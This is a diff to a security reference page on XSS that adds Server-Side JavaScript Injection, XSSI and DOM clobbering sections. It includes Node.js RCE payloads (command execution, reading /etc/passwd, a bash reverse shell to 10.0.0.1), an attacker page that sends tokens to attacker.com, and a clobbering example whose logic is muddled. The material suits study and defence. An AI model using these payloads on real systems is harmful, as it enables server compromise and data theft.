@@ -1,6 +1,6 @@
 ---
 title: Cross-Site Scripting
-description: A practical reference for Cross-Site Scripting classifications, payload execution techniques, event-based payloads, blind XSS, context-specific injection, and reconnaissance tools.
+description: A practical reference for Cross-Site Scripting classifications, payload execution techniques, event-based payloads, blind XSS, context-specific injection, DOM clobbering, and reconnaissance tools.
 draft: false
 tags:
   - XSS
@@ -31,19 +31,23 @@ flowchart TD
     B -->|"Stored on server<br/>(DB / comment / profile)"| S["SXSS<br/>Stored"]
     B -->|"Never sent to server<br/>(fragment / hash / postMessage)"| D["DXSS<br/>DOM-based"]
     B -->|"Stored, fires in<br/>admin / backend panel"| BL["BXSS<br/>Blind"]
+    B -->|"Evaluated by Server<br/>(Node.js eval)"| SSJI["SSJI<br/>Server-Side JS Injection"]
 
     R --> V1["Victim clicks crafted link"]
     S --> V2["Victim browses normally"]
     D --> V3["Victim opens crafted URL"]
     BL --> V4["Admin opens affected view"]
+    SSJI --> SRV["Server executes payload<br/>(No victim interaction needed)"]
 
     V1 --> EXEC["Script executes<br/>in victim's browser"]
     V2 --> EXEC
     V3 --> EXEC
     V4 --> CALL["Callback to XSS Hunter<br/>+ cookies / DOM / screenshot"]
+    SRV --> RCE["Remote Code Execution<br/>Server Compromise"]
 
     EXEC --> IMPACT["Session hijack<br/>Cookie theft<br/>DOM manipulation<br/>Credential capture"]
     CALL --> IMPACT
+    RCE --> IMPACT2["Server Data Breach<br/>Full System Takeover"]
 
     B -.->|"Victim pastes payload<br/>into own console / address bar"| SELF["Self-XSS<br/>(low severity, no remote delivery)"]
     B -.->|"Attacker page includes<br/>victim-origin script"| XSSI["XSSI<br/>Cross-Site Script Inclusion<br/>(information disclosure)"]
@@ -53,19 +57,22 @@ flowchart TD
     style S fill:#8bc34a,stroke:#333,stroke-width:1px,color:#000
     style D fill:#8bc34a,stroke:#333,stroke-width:1px,color:#000
     style BL fill:#8bc34a,stroke:#333,stroke-width:1px,color:#000
+    style SSJI fill:#9b59b6,stroke:#333,stroke-width:1px,color:#fff
     style SELF fill:#e0e0e0,stroke:#999,stroke-width:1px,color:#666
     style XSSI fill:#e0e0e0,stroke:#999,stroke-width:1px,color:#666
     style EXEC fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
     style IMPACT fill:#e76f51,stroke:#333,stroke-width:2px,color:#fff
     style CALL fill:#9b59b6,stroke:#333,stroke-width:1px,color:#fff
+    style RCE fill:#CC0030,stroke:#333,stroke-width:2px,color:#fff
+    style IMPACT2 fill:#CC0030,stroke:#333,stroke-width:2px,color:#fff
 ```
 
 <Callout type="tip" title="How to read the diagram">
 - **Green nodes** are the four classical XSS classifications — distinguished by *where the payload lives before reaching the victim*.
 - **Grey nodes** are the edge cases: Self-XSS (no remote delivery, victim-only) and XSSI (sibling technique, not a subtype of XSS).
-- **Blue node** is the moment of execution in the victim's browser — every path converges here.
-- **Purple node** is the Blind-XSS callback — the only way the attacker learns the payload fired.
-- **Red node** is the impact — every successful execution can lead here.
+- **Blue node** is the moment of execution in the victim's browser — every client-side path converges here.
+- **Purple nodes** represent advanced vectors: the Blind-XSS callback (how the attacker learns it fired) and the SSJI path (Server-Side execution, which requires no victim interaction).
+- **Red nodes** are the impact zones: Orange-red for client-side impacts (session hijack, cookie theft) and **Dark Red** for server-side RCE and full system takeover resulting from SSJI.
 </Callout>
 
 ---
@@ -109,6 +116,18 @@ The XSS family is grouped by **where the payload is stored** and **how it reache
     - **Delivery:** a crafted URL whose fragment (`#...`) or parameter is read by the vulnerable client-side code.
     - **Server visibility:** the payload may **never appear in the server logs** because it lives in the fragment / is consumed purely client-side.
     - **Typical vector:** `https://victim.com/page#<img src=x onerror=alert(1)>`
+  </Tab>
+
+  <Tab title="SSJI — Server-Side">
+    **Server-Side JavaScript Injection (SSJI)** — the payload is evaluated by the Node.js backend instead of the victim's browser. This is a critical escalation from Client-Side XSS.
+
+    - **Sink:** Server-side `eval()`, `Function()` constructor, or `vm` modules that execute user-controlled input.
+    - **Delivery:** Send the payload via any API parameter or header that the server evaluates. **No victim interaction is required.**
+    - **Impact:** Direct **Remote Code Execution (RCE)**, leading to full server compromise.
+    - **Typical vector:** `https://victim.com/api/calc?expression=require('child_process').execSync('id')`
+    <Note title="Not an XSS subtype">
+      SSJI is grouped here because it shares the JavaScript injection root cause, but it is strictly an RCE vulnerability, not a Client-Side XSS subtype. See the "Advanced JS Injection Vectors" section below for detailed payloads.
+    </Note>
   </Tab>
 
   <Tab title="XSSI — Information Disclosure">
@@ -464,6 +483,140 @@ The tools below are the standard toolkit for finding XSS-relevant **endpoints an
   xsser -u "https://victim.com/search?q=XSS" --auto
   ```
 </Callout>
+
+---
+
+## Advanced JS Injection & DOM Vectors
+
+While XSS focuses on executing JavaScript in the victim's browser, there are sibling techniques that either execute JavaScript on the server (SSJI), abuse the browser's script inclusion rules to steal data from other origins (XSSI), or manipulate the DOM environment itself to bypass security checks (DOM Clobbering).
+
+### Server-Side JavaScript Injection (SSJI)
+
+<Callout type="danger" title="SSJI = Remote Code Execution">
+**SSJI (Server-Side JavaScript Injection)** occurs when an application evaluates user-controlled input on the server side using `eval()`, `Function()`, or `vm` modules in a Node.js environment. 
+
+Unlike XSS, which is constrained by the browser's sandbox, SSJI executes in the context of the Node.js process. If successful, it leads directly to **Remote Code Execution (RCE)**, allowing the attacker to run operating system commands, read files, or establish a reverse shell.
+</Callout>
+
+```mermaid
+flowchart TD
+    A["Attacker sends payload"] --> B["Node.js Server"]
+    B --> C{"eval(req.query.input)"}
+    C --> D["Payload executes in Node.js context"]
+    D --> E["require('child_process').exec('id')"]
+    E --> F["OS Command Execution RCE"]
+    
+    style C fill:#FF003C,stroke:#333,stroke-width:2px,color:#fff
+    style F fill:#CC0030,stroke:#333,stroke-width:2px,color:#fff
+```
+
+**Vulnerable Code Example (Express.js):**
+```javascript
+const express = require('express');
+const app = express();
+
+app.get('/api/calc', (req, res) => {
+    // Vulnerable: User input is passed directly to eval() on the server
+    try {
+        const result = eval(req.query.expression);
+        res.send({ result: result });
+    } catch (e) {
+        res.status(500).send({ error: e.message });
+    }
+});
+```
+
+**SSJI Payloads (Node.js RCE):**
+Because Node.js has access to the `require` function, an attacker can import the `child_process` module and execute system commands.
+
+<Accordion title="SSJI RCE Payloads">
+```javascript
+// 1. Execute a command and return the output
+res.end(require('child_process').execSync('id').toString())
+
+// 2. Read a sensitive file
+res.end(require('fs').readFileSync('/etc/passwd').toString())
+
+// 3. Blind RCE (Reverse shell)
+require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')
+```
+</Accordion>
+
+### Cross-Site Script Inclusion (XSSI)
+
+<Callout type="info" title="XSSI = Information Disclosure">
+**XSSI (Cross-Site Script Inclusion)** is a technique where an attacker's page includes a script from a victim's origin using the `<script src="...">` tag. 
+
+Because the `<script>` tag is **not** subject to the Same-Origin Policy (SOP), the attacker's page can load cross-origin responses. If the victim's endpoint returns sensitive data in a JavaScript-parseable format (like JSONP, JSON arrays, or JS objects), the attacker can use prototype overriding to intercept and steal the data.
+</Callout>
+
+**How XSSI Works:**
+1. The victim endpoint returns sensitive data (e.g., `{"user":"admin","token":"12345"}` or a JSONP callback).
+2. The attacker defines a custom `set` trap on `Object.prototype` or `Array.prototype` on their malicious page.
+3. The attacker's page includes `<script src="https://victim.com/api/profile"></script>`.
+4. The browser loads the script, and as the JSON is parsed into JS objects, the attacker's trap fires, leaking the sensitive data to the attacker's script.
+
+**Attacker's Malicious Page Example:**
+```html
+<html>
+<body>
+<script>
+    // 1. Override the Object prototype to intercept property assignments
+    Object.defineProperty(Object.prototype, 'token', {
+        set: function(value) {
+            // Exfiltrate the stolen token to the attacker's server
+            new Image().src = "https://attacker.com/log?token=" + value;
+        }
+    });
+
+    // 2. Include the victim's cross-origin script
+    // The browser will fetch this despite SOP restrictions for <script> tags
+    // If it returns JS objects, our prototype trap fires.
+</script>
+<script src="https://victim.com/api/profile"></script>
+</body>
+</html>
+```
+
+### DOM Clobbering
+
+<Callout type="warning" title="DOM Clobbering = Environment Manipulation">
+**DOM Clobbering** is a technique where an attacker injects HTML elements with specific `id` or `name` attributes that overwrite or "clobber" existing JavaScript variables or properties on the global `window` or `document` objects.
+
+Browsers automatically create references to HTML elements with `id` attributes as properties on the `window` object, and elements with `name` attributes as properties on the `document` object. If a client-side script relies on these global variables for configuration or logic, an attacker can inject HTML to alter the script's execution flow, often leading to DOM-based XSS.
+</Callout>
+
+**Vulnerable Code Example:**
+The application has a sanitizer or config check that uses a global variable:
+```javascript
+// The script assumes window.config is a safe object
+if (window.config && window.config.safeMode) {
+    document.getElementById("output").innerHTML = "Safe mode enabled";
+} else {
+    // If safeMode is undefined, it might default to unsafe rendering
+    document.getElementById("output").innerHTML = userInput; // XSS sink
+}
+```
+
+**DOM Clobbering Payload:**
+An attacker injects HTML that replaces the `config` object with a collection of HTML elements. By using a `<form>` and `<input>`, they can clobber `window.config` and set `window.config.safeMode` to a DOM element (which evaluates to a truthy value).
+
+```html
+<!-- Inject this payload -->
+<form id="config"><input name="safeMode" value="false"></form>
+```
+
+*How it works:*
+1. `window.config` is clobbered by the `<form id="config">` element.
+2. `window.config.safeMode` resolves to the `<input name="safeMode">` element (because named elements inside a form become properties of the form).
+3. In JavaScript, an HTML element is **truthy**. Therefore, `if (window.config.safeMode)` evaluates to `true`, causing the script to take the "Safe mode enabled" path, or conversely, if the logic is inverted, it can be used to bypass security checks.
+4. Clobbering is often used to bypass sanitizers by making them throw errors or execute unintended code paths.
+
+<Callout type="warning" title="XSSI vs XSS vs DOM Clobbering">
+Do not confuse these three. In XSS, the attacker injects code. In XSSI, the attacker's page *includes* a legitimate script from the victim. In DOM Clobbering, the attacker injects HTML that *breaks* the JavaScript logic by overwriting variables, using the browser's native DOM-to-JavaScript mapping.
+</Callout>
+
+---
 
 ## Summary
 
